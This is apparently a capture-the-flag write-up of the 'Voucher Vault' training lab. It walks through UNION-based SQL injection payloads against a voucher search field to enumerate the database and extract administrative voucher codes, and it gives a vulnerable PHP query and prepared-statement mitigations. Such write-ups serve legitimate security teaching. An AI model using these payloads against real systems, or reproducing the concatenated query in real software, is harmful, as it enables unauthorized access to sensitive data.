---
title: "SQL Injection in Voucher Search Leads to Executive Voucher Disclosure | Voucher Vault"
date: 2026-06-02 00:00:00 +0530
categories: [A05 - Injection, SQL Injection]
tags: [webverselabs-pro, sql-injection, union-based-sqli, database-enumeration, information-schema, mariadb]
author: Shivansh Sharma
image:
  path: /assets/images/posts/voucher-vault-sqli.webp
  alt: SQL Injection in Voucher Search Leads to Executive Voucher Disclosure
---

## Lab Link

Lab: [Voucher Vault](https://dashboard.webverselabs-pro.com/challenges/voucher-vault)

---

## Overview

Voucher Vault is an internal employee rewards platform used by Redzone Insurance to distribute and manage company gift cards and incentive vouchers.

The application provides a voucher search feature that allows employees to locate available rewards. During testing, the search functionality was found to concatenate user-supplied input directly into a backend SQL query without proper parameterization.

This flaw allows attackers to perform SQL Injection, enumerate database structures, and access sensitive data stored in administrative tables that should never be exposed to normal employees.

---

## Objective

Exploit the vulnerable voucher search functionality to enumerate the database and retrieve the executive voucher code stored within the administrative voucher table.

---

## Vulnerability Identification

### Classification Hierarchy

```text
A05 - Injection
└── SQL Injection
    └── UNION-Based SQL Injection
        └── Database Enumeration and Sensitive Data Disclosure
```

---

## Reconnaissance

The application provides employee access using the supplied credentials:

```text
alice@redzone.local
password1
```

After authentication, the voucher search feature becomes available.

Search functionality is a common target for SQL Injection testing because user-controlled input is frequently incorporated into database queries.

---

## Confirming SQL Injection

Submit the following payload into the voucher search field:

```sql
' or 1=1-- -
```

The application returns all available vouchers rather than filtered search results.

This indicates that user input is being interpreted as SQL syntax and successfully modifies the backend query logic.

The search feature is vulnerable to SQL Injection.

---

## Determining Column Count

To perform a UNION-based attack, determine the number of columns returned by the original query.

Payload:

```sql
' order by 3-- -
```

The application responds normally, indicating that the query contains three columns.

---

## Identifying the Database

A UNION query is used to retrieve the active database name.

Payload:

```sql
' UNION SELECT NULL,database(),NULL-- -
```

Response:

```text
chalapp
```

Current database:

```text
chalapp
```

---

## Enumerating Tables

The next step is identifying available tables within the database.

Payload:

```sql
' UNION SELECT NULL,table_name,NULL
FROM information_schema.tables
WHERE table_schema='chalapp'-- -
```

Response:

```text
admin_vouchers
redemptions
vouchers
```

Interesting table:

```text
admin_vouchers
```

The table name suggests privileged voucher information.

---

## Enumerating Columns

Inspect the table structure using `information_schema.columns`.

Payload:

```sql
' UNION SELECT NULL,column_name,NULL
FROM information_schema.columns
WHERE table_name='admin_vouchers'-- -
```

Response:

```text
id
code
value
expiry
```

The most interesting field is:

```text
code
```

---

## Extracting Voucher Codes

Retrieve the contents of the code column.

Payload:

```sql
' UNION SELECT NULL,code,NULL
FROM admin_vouchers-- -
```

Response:

```text
WEBVERSE{.....}
```

The administrative voucher code is disclosed directly through the vulnerable search functionality.

---

## Flag

```text
WEBVERSE{.....}
```

---

## Proof of Exploitation

Database enumeration:

```sql
database()
```

Result:

```text
chalapp
```

Table enumeration:

```sql
information_schema.tables
```

Result:

```text
admin_vouchers
redemptions
vouchers
```

Column enumeration:

```sql
information_schema.columns
```

Result:

```text
id
code
value
expiry
```

Sensitive data extraction:

```sql
SELECT code FROM admin_vouchers
```

Result:

```text
WEBVERSE{.....}
```

---

## Root Cause Analysis

The application incorporates user-controlled search input directly into SQL queries.

A vulnerable implementation would resemble:

```php
$query = "SELECT * FROM vouchers WHERE name LIKE '%" . $_GET['search'] . "%'";
```

Because the input is concatenated directly into the query string, attackers can inject arbitrary SQL syntax and alter query execution.

The absence of prepared statements allows complete database enumeration and unauthorized access to sensitive records.

---

## Impact

An attacker can:

* Enumerate database structures
* Access unauthorized records
* Extract administrative data
* Retrieve sensitive business information
* Bypass intended application restrictions

In real-world environments, SQL Injection frequently results in complete database compromise and large-scale data exposure.

---

## Mitigation

### Use Parameterized Queries

Instead of:

```php
$query = "SELECT * FROM vouchers WHERE name LIKE '%$search%'";
```

Use:

```php
$stmt = $pdo->prepare(
    "SELECT * FROM vouchers WHERE name LIKE ?"
);

$stmt->execute(["%{$search}%"]);
```

### Validate User Input

Apply strict validation to search parameters.

### Restrict Database Permissions

Application accounts should not have unrestricted access to administrative tables.

### Disable Verbose Database Errors

Prevent database details from being exposed to users.

### Apply Defense in Depth

Combine:

* Prepared statements
* Input validation
* Least privilege
* Secure error handling

to prevent SQL Injection attacks.

---

## Real-World Insight

Search functionality is one of the most common locations for SQL Injection vulnerabilities because developers frequently construct dynamic queries around user-supplied keywords.

Attackers commonly use SQL Injection to:

```text
Enumerate databases
Discover tables
Extract credentials
Access administrative records
Retrieve secrets
```

The Voucher Vault challenge demonstrates a fundamental security principle:

**Any user input that reaches a SQL query without parameterization becomes part of the SQL statement itself.**
